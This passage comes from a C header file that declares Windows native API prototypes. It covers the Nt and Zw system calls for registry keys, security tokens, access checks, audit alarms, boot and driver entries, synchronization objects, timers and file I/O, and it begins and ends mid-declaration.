    IN HANDLE LowPrecedenceKeyHandle,
    IN HANDLE FileHandle
    );


NTSTATUS
NTAPI
NtSetValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN OPTIONAL ULONG TitleIndex,
    IN ULONG Type,
    IN OPTIONAL PVOID Data,
    IN ULONG DataSize
    );


NTSTATUS
NTAPI
NtUnloadKey(
    IN POBJECT_ATTRIBUTES TargetKey
    );


NTSTATUS
NTAPI
NtUnloadKey2(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN ULONG Flags
    );


NTSTATUS
NTAPI
NtUnloadKeyEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN OPTIONAL HANDLE Event
    );


NTSTATUS
NTAPI
NtSetInformationKey(
    IN HANDLE KeyHandle,
    IN KEY_SET_INFORMATION_CLASS KeySetInformationClass,
    IN PVOID KeySetInformation,
    IN ULONG KeySetInformationLength
    );


NTSTATUS
NTAPI
NtQueryOpenSubKeys(
    IN POBJECT_ATTRIBUTES TargetKey,
    OUT PULONG  HandleCount
    );


NTSTATUS
NTAPI
NtQueryOpenSubKeysEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN ULONG BufferLength,
    OUT PVOID Buffer,
    OUT PULONG RequiredSize
    );


NTSTATUS
NTAPI
NtLockRegistryKey(
    IN HANDLE KeyHandle
    );


NTSTATUS
NTAPI
NtLockProductActivationKeys(
    IN OUT OPTIONAL ULONG *pPrivateVer,
    OUT OPTIONAL ULONG *pSafeMode
    );


NTSTATUS
NTAPI
NtAccessCheck (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );


NTSTATUS
NTAPI
NtAccessCheckByType (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );


NTSTATUS
NTAPI
NtAccessCheckByTypeResultList (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );


NTSTATUS
NTAPI
NtCreateToken(
    OUT PHANDLE TokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN TOKEN_TYPE TokenType,
    IN PLUID AuthenticationId,
    IN PLARGE_INTEGER ExpirationTime,
    IN PTOKEN_USER User,
    IN PTOKEN_GROUPS Groups,
    IN PTOKEN_PRIVILEGES Privileges,
    IN OPTIONAL PTOKEN_OWNER Owner,
    IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
    IN OPTIONAL PTOKEN_DEFAULT_DACL DefaultDacl,
    IN PTOKEN_SOURCE TokenSource
    );


NTSTATUS
NTAPI
NtCompareTokens(
    IN HANDLE FirstTokenHandle,
    IN HANDLE SecondTokenHandle,
    OUT PBOOLEAN Equal
    );


NTSTATUS
NTAPI
NtOpenThreadToken(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    OUT PHANDLE TokenHandle
    );


NTSTATUS
NTAPI
NtOpenThreadTokenEx(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    IN ULONG HandleAttributes,
    OUT PHANDLE TokenHandle
    );


NTSTATUS
NTAPI
NtOpenProcessToken(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    OUT PHANDLE TokenHandle
    );


NTSTATUS
NTAPI
NtOpenProcessTokenEx(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    OUT PHANDLE TokenHandle
    );


NTSTATUS
NTAPI
NtDuplicateToken(
    IN HANDLE ExistingTokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN EffectiveOnly,
    IN TOKEN_TYPE TokenType,
    OUT PHANDLE NewTokenHandle
    );


NTSTATUS
NTAPI
NtFilterToken (
    IN HANDLE ExistingTokenHandle,
    IN ULONG Flags,
    IN OPTIONAL PTOKEN_GROUPS SidsToDisable,
    IN OPTIONAL PTOKEN_PRIVILEGES PrivilegesToDelete,
    IN OPTIONAL PTOKEN_GROUPS RestrictedSids,
    OUT PHANDLE NewTokenHandle
    );


NTSTATUS
NTAPI
NtImpersonateAnonymousToken(
    IN HANDLE ThreadHandle
    );


NTSTATUS
NTAPI
NtQueryInformationToken (
    IN HANDLE TokenHandle,
    IN TOKEN_INFORMATION_CLASS TokenInformationClass,
    OUT PVOID TokenInformation,
    IN ULONG TokenInformationLength,
    OUT PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetInformationToken (
    IN HANDLE TokenHandle,
    IN TOKEN_INFORMATION_CLASS TokenInformationClass,
    IN PVOID TokenInformation,
    IN ULONG TokenInformationLength
    );


NTSTATUS
NTAPI
NtAdjustPrivilegesToken (
    IN HANDLE TokenHandle,
    IN BOOLEAN DisableAllPrivileges,
    IN OPTIONAL PTOKEN_PRIVILEGES NewState,
    IN OPTIONAL ULONG BufferLength,
    OUT PTOKEN_PRIVILEGES PreviousState,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtAdjustGroupsToken (
    IN HANDLE TokenHandle,
    IN BOOLEAN ResetToDefault,
    IN PTOKEN_GROUPS NewState ,
    IN OPTIONAL ULONG BufferLength ,
    OUT PTOKEN_GROUPS PreviousState ,
    OUT PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtPrivilegeCheck (
    IN HANDLE ClientToken,
    IN OUT  PPRIVILEGE_SET RequiredPrivileges,
    OUT PBOOLEAN Result
    );


NTSTATUS
NTAPI
NtAccessCheckAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ACCESS_MASK DesiredAccess,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtAccessCheckByTypeAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtAccessCheckByTypeResultListAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtAccessCheckByTypeResultListAndAuditAlarmByHandle (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN HANDLE ClientToken,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtOpenObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN OPTIONAL PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN ACCESS_MASK GrantedAccess,
    IN OPTIONAL PPRIVILEGE_SET Privileges,
    IN BOOLEAN ObjectCreation,
    IN BOOLEAN AccessGranted,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtPrivilegeObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN PPRIVILEGE_SET Privileges,
    IN BOOLEAN AccessGranted
    );


NTSTATUS
NTAPI
NtCloseObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN BOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtDeleteObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN BOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtPrivilegedServiceAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN PUNICODE_STRING ServiceName,
    IN HANDLE ClientToken,
    IN PPRIVILEGE_SET Privileges,
    IN BOOLEAN AccessGranted
    );


NTSTATUS
NTAPI
NtContinue (
    IN PCONTEXT ContextRecord,
    IN BOOLEAN TestAlert
    );


NTSTATUS
NTAPI
NtRaiseException (
    IN PEXCEPTION_RECORD ExceptionRecord,
    IN PCONTEXT ContextRecord,
    IN BOOLEAN FirstChance
    );

// end_ntapi


// begin_zwapi
NTSTATUS
NTAPI
ZwDelayExecution (
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER DelayInterval
    );



NTSTATUS
NTAPI
ZwQuerySystemEnvironmentValue (
    IN PUNICODE_STRING VariableName,
    OUT PWSTR VariableValue,
    IN USHORT ValueLength,
    OUT OPTIONAL PUSHORT ReturnLength
    );



NTSTATUS
NTAPI
ZwSetSystemEnvironmentValue (
    IN PUNICODE_STRING VariableName,
    IN PUNICODE_STRING VariableValue
    );



NTSTATUS
NTAPI
ZwQuerySystemEnvironmentValueEx (
    IN PUNICODE_STRING VariableName,
    IN LPGUID VendorGuid,
    OUT OPTIONAL PVOID Value,
    IN OUT PULONG ValueLength,
    OUT OPTIONAL PULONG Attributes
    );



NTSTATUS
NTAPI
ZwSetSystemEnvironmentValueEx (
    IN PUNICODE_STRING VariableName,
    IN LPGUID VendorGuid,
    IN OPTIONAL PVOID Value,
    IN ULONG ValueLength,
    IN ULONG Attributes
    );



NTSTATUS
NTAPI
ZwEnumerateSystemEnvironmentValuesEx (
    IN ULONG InformationClass,
    OUT PVOID Buffer,
    IN OUT PULONG BufferLength
    );



NTSTATUS
NTAPI
ZwAddBootEntry (
    IN PBOOT_ENTRY BootEntry,
    OUT OPTIONAL PULONG Id
    );



NTSTATUS
NTAPI
ZwDeleteBootEntry (
    IN ULONG Id
    );



NTSTATUS
NTAPI
ZwModifyBootEntry (
    IN PBOOT_ENTRY BootEntry
    );



NTSTATUS
NTAPI
ZwEnumerateBootEntries (
    OUT OPTIONAL PVOID Buffer,
    IN OUT PULONG BufferLength
    );



NTSTATUS
NTAPI
ZwQueryBootEntryOrder (
    OUT OPTIONAL PULONG Ids,
    IN OUT PULONG Count
    );



NTSTATUS
NTAPI
ZwSetBootEntryOrder (
    IN PULONG Ids,
    IN ULONG Count
    );



NTSTATUS
NTAPI
ZwQueryBootOptions (
    OUT OPTIONAL PBOOT_OPTIONS BootOptions,
    IN OUT PULONG BootOptionsLength
    );



NTSTATUS
NTAPI
ZwSetBootOptions (
    IN PBOOT_OPTIONS BootOptions,
    IN ULONG FieldsToChange
    );



NTSTATUS
NTAPI
ZwTranslateFilePath (
    IN PFILE_PATH InputFilePath,
    IN ULONG OutputType,
    OUT OPTIONAL PFILE_PATH OutputFilePath,
    IN OUT OPTIONAL PULONG OutputFilePathLength
    );



NTSTATUS
NTAPI
ZwAddDriverEntry (
    IN PEFI_DRIVER_ENTRY DriverEntry,
    OUT OPTIONAL PULONG Id
    );



NTSTATUS
NTAPI
ZwDeleteDriverEntry (
    IN ULONG Id
    );



NTSTATUS
NTAPI
ZwModifyDriverEntry (
    IN PEFI_DRIVER_ENTRY DriverEntry
    );



NTSTATUS
NTAPI
ZwEnumerateDriverEntries (
    OUT PVOID Buffer,
    IN OUT PULONG BufferLength
    );



NTSTATUS
NTAPI
ZwQueryDriverEntryOrder (
    OUT PULONG Ids,
    IN OUT PULONG Count
    );



NTSTATUS
NTAPI
ZwSetDriverEntryOrder (
    IN PULONG Ids,
    IN ULONG Count
    );



NTSTATUS
NTAPI
ZwClearEvent (
    IN HANDLE EventHandle
    );



NTSTATUS
NTAPI
ZwCreateEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN EVENT_TYPE EventType,
    IN BOOLEAN InitialState
    );



NTSTATUS
NTAPI
ZwOpenEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwPulseEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );



NTSTATUS
NTAPI
ZwQueryEvent (
    IN HANDLE EventHandle,
    IN EVENT_INFORMATION_CLASS EventInformationClass,
    OUT PVOID EventInformation,
    IN ULONG EventInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwResetEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );



NTSTATUS
NTAPI
ZwSetEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );



NTSTATUS
NTAPI
ZwSetEventBoostPriority (
    IN HANDLE EventHandle
    );



NTSTATUS
NTAPI
ZwCreateEventPair (
    OUT PHANDLE EventPairHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwOpenEventPair (
    OUT PHANDLE EventPairHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwWaitLowEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwWaitHighEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwSetLowWaitHighEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwSetHighWaitLowEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwSetLowEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwSetHighEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwCreateMutant (
    OUT PHANDLE MutantHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN InitialOwner
    );



NTSTATUS
NTAPI
ZwOpenMutant (
    OUT PHANDLE MutantHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQueryMutant (
    IN HANDLE MutantHandle,
    IN MUTANT_INFORMATION_CLASS MutantInformationClass,
    OUT PVOID MutantInformation,
    IN ULONG MutantInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwReleaseMutant (
    IN HANDLE MutantHandle,
    OUT OPTIONAL PLONG PreviousCount
    );



NTSTATUS
NTAPI
ZwCreateSemaphore (
    OUT PHANDLE SemaphoreHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN LONG InitialCount,
    IN LONG MaximumCount
    );



NTSTATUS
NTAPI
ZwOpenSemaphore(
    OUT PHANDLE SemaphoreHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQuerySemaphore (
    IN HANDLE SemaphoreHandle,
    IN SEMAPHORE_INFORMATION_CLASS SemaphoreInformationClass,
    OUT PVOID SemaphoreInformation,
    IN ULONG SemaphoreInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwReleaseSemaphore(
    IN HANDLE SemaphoreHandle,
    IN LONG ReleaseCount,
    OUT OPTIONAL PLONG PreviousCount
    );



NTSTATUS
NTAPI
ZwCreateTimer (
    OUT PHANDLE TimerHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN TIMER_TYPE TimerType
    );



NTSTATUS
NTAPI
ZwOpenTimer (
    OUT PHANDLE TimerHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwCancelTimer (
    IN HANDLE TimerHandle,
    OUT OPTIONAL PBOOLEAN CurrentState
    );



NTSTATUS
NTAPI
ZwQueryTimer (
    IN HANDLE TimerHandle,
    IN TIMER_INFORMATION_CLASS TimerInformationClass,
    OUT PVOID TimerInformation,
    IN ULONG TimerInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetTimer (
    IN HANDLE TimerHandle,
    IN PLARGE_INTEGER DueTime,
    IN OPTIONAL PTIMER_APC_ROUTINE TimerApcRoutine,
    IN OPTIONAL PVOID TimerContext,
    IN BOOLEAN ResumeTimer,
    IN OPTIONAL LONG Period,
    OUT OPTIONAL PBOOLEAN PreviousState
    );



NTSTATUS
NTAPI
ZwQuerySystemTime (
    OUT PLARGE_INTEGER SystemTime
    );



NTSTATUS
NTAPI
ZwSetSystemTime (
    IN OPTIONAL PLARGE_INTEGER SystemTime,
    OUT OPTIONAL PLARGE_INTEGER PreviousTime
    );



NTSTATUS
NTAPI
ZwQueryTimerResolution (
    OUT PULONG MaximumTime,
    OUT PULONG MinimumTime,
    OUT PULONG CurrentTime
    );



NTSTATUS
NTAPI
ZwSetTimerResolution (
    IN ULONG DesiredTime,
    IN BOOLEAN SetResolution,
    OUT PULONG ActualTime
    );



NTSTATUS
NTAPI
ZwAllocateLocallyUniqueId (
    OUT PLUID Luid
    );



NTSTATUS
NTAPI
ZwSetUuidSeed (
    IN PCHAR Seed
    );



NTSTATUS
NTAPI
ZwAllocateUuids (
    OUT PULARGE_INTEGER Time,
    OUT PULONG Range,
    OUT PULONG Sequence,
    OUT PCHAR Seed
    );



NTSTATUS
NTAPI
ZwCreateProfile (
    OUT PHANDLE ProfileHandle,
    IN HANDLE Process OPTIONAL,
    IN PVOID ProfileBase,
    IN SIZE_T ProfileSize,
    IN ULONG BucketSize,
    IN PULONG Buffer,
    IN ULONG BufferSize,
    IN KPROFILE_SOURCE ProfileSource,
    IN KAFFINITY Affinity
    );



NTSTATUS
NTAPI
ZwStartProfile (
    IN HANDLE ProfileHandle
    );



NTSTATUS
NTAPI
ZwStopProfile (
    IN HANDLE ProfileHandle
    );



NTSTATUS
NTAPI
ZwSetIntervalProfile (
    IN ULONG Interval,
    IN KPROFILE_SOURCE Source
    );



NTSTATUS
NTAPI
ZwQueryIntervalProfile (
    IN KPROFILE_SOURCE ProfileSource,
    OUT PULONG Interval
    );



NTSTATUS
NTAPI
ZwQueryPerformanceCounter (
    OUT PLARGE_INTEGER PerformanceCounter,
    OUT OPTIONAL PLARGE_INTEGER PerformanceFrequency
    );



NTSTATUS
NTAPI
ZwCreateKeyedEvent (
    OUT PHANDLE KeyedEventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG Flags
    );



NTSTATUS
NTAPI
ZwOpenKeyedEvent (
    OUT PHANDLE KeyedEventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwReleaseKeyedEvent (
    IN HANDLE KeyedEventHandle,
    IN PVOID KeyValue,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwWaitForKeyedEvent (
    IN HANDLE KeyedEventHandle,
    IN PVOID KeyValue,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwQuerySystemInformation (
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT OPTIONAL PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetSystemInformation (
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OPTIONAL PVOID SystemInformation,
    IN ULONG SystemInformationLength
    );



NTSTATUS
NTAPI
ZwSystemDebugControl (
    IN SYSDBG_COMMAND Command,
    IN OPTIONAL PVOID InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID OutputBuffer,
    IN ULONG OutputBufferLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwRaiseHardError (
    IN NTSTATUS ErrorStatus,
    IN ULONG NumberOfParameters,
    IN ULONG UnicodeStringParameterMask,
    IN OPTIONAL PULONG_PTR Parameters,
    IN ULONG ValidResponseOptions,
    OUT PULONG Response
    );



NTSTATUS
NTAPI
ZwQueryDefaultLocale (
    IN BOOLEAN UserProfile,
    OUT PLCID DefaultLocaleId
    );



NTSTATUS
NTAPI
ZwSetDefaultLocale (
    IN BOOLEAN UserProfile,
    IN LCID DefaultLocaleId
    );



NTSTATUS
NTAPI
ZwQueryInstallUILanguage (
    OUT LANGID *InstallUILanguageId
    );



NTSTATUS
NTAPI
ZwQueryDefaultUILanguage (
    OUT LANGID *DefaultUILanguageId
    );



NTSTATUS
NTAPI
ZwSetDefaultUILanguage (
    IN LANGID DefaultUILanguageId
    );



NTSTATUS
NTAPI
ZwSetDefaultHardErrorPort(
    IN HANDLE DefaultHardErrorPort
    );



NTSTATUS
NTAPI
ZwShutdownSystem (
    IN SHUTDOWN_ACTION Action
    );



NTSTATUS
NTAPI
ZwDisplayString (
    IN PUNICODE_STRING String
    );



NTSTATUS
NTAPI
ZwAddAtom (
    IN OPTIONAL PWSTR AtomName,
    IN ULONG Length,
    OUT OPTIONAL PRTL_ATOM Atom
    );



NTSTATUS
NTAPI
ZwFindAtom (
    IN OPTIONAL PWSTR AtomName,
    IN ULONG Length,
    OUT OPTIONAL PRTL_ATOM Atom
    );



NTSTATUS
NTAPI
ZwDeleteAtom (
    IN RTL_ATOM Atom
    );



NTSTATUS
NTAPI
ZwQueryInformationAtom(
    IN RTL_ATOM Atom,
    IN ATOM_INFORMATION_CLASS AtomInformationClass,
    OUT OPTIONAL PVOID AtomInformation,
    IN ULONG AtomInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwCancelIoFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );



NTSTATUS
NTAPI
ZwCreateNamedPipeFile (
     OUT PHANDLE FileHandle,
     IN ULONG DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     OUT PIO_STATUS_BLOCK IoStatusBlock,
     IN ULONG ShareAccess,
     IN ULONG CreateDisposition,
     IN ULONG CreateOptions,
     IN ULONG NamedPipeType,
     IN ULONG ReadMode,
     IN ULONG CompletionMode,
     IN ULONG MaximumInstances,
     IN ULONG InboundQuota,
     IN ULONG OutboundQuota,
     IN OPTIONAL PLARGE_INTEGER DefaultTimeout
     );



NTSTATUS
NTAPI
ZwCreateMailslotFile (
     OUT PHANDLE FileHandle,
     IN ULONG DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     OUT PIO_STATUS_BLOCK IoStatusBlock,
     IN ULONG CreateOptions,
     IN ULONG MailslotQuota,
     IN ULONG MaximumMessageSize,
     IN PLARGE_INTEGER ReadTimeout
     );



NTSTATUS
NTAPI
ZwDeleteFile (
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwFlushBuffersFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );



NTSTATUS
NTAPI
ZwNotifyChangeDirectoryFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree
    );



NTSTATUS
NTAPI
ZwQueryAttributesFile (
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PFILE_BASIC_INFORMATION FileInformation
    );



NTSTATUS
NTAPI
ZwQueryFullAttributesFile(
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PFILE_NETWORK_OPEN_INFORMATION FileInformation
    );



NTSTATUS
NTAPI
ZwQueryEaFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN PVOID EaList,
    IN ULONG EaListLength,
    IN OPTIONAL PULONG EaIndex OPTIONAL,
    IN BOOLEAN RestartScan
    );


NTSTATUS
NTAPI
ZwCreateFile (
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN OPTIONAL PLARGE_INTEGER AllocationSize,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN OPTIONAL PVOID EaBuffer,
    IN ULONG EaLength
    );



NTSTATUS
NTAPI
ZwDeviceIoControlFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG IoControlCode,
    IN OPTIONAL PVOID  InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID  OutputBuffer,
    IN ULONG OutputBufferLength
    );



NTSTATUS
NTAPI
ZwFsControlFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG FsControlCode,
    IN OPTIONAL PVOID  InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID  OutputBuffer,
    IN ULONG OutputBufferLength
    );



NTSTATUS
NTAPI
ZwLockFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER ByteOffset,
    IN PLARGE_INTEGER Length,
    IN ULONG Key,
    IN BOOLEAN FailImmediately,
    IN BOOLEAN ExclusiveLock
    );



NTSTATUS
NTAPI
ZwOpenFile (
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG ShareAccess,
    IN ULONG OpenOptions
    );



NTSTATUS
NTAPI
ZwQueryDirectoryFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
